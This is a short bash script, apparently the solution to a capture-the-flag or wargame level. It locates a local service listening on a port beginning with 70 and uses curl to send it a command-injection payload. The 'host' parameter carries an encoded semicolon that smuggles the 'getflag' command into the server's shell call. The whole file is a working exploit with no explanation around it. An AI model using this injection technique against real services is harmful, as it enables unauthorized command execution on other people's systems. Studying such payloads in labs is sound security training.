#!/usr/bin/env bash

port="$(ss -ant | awk '/LISTEN.+:70/ {print $4}')"
curl -s "http://127.0.0.1:${port##*:}?host=::1%3bgetflag%3becho%20a"
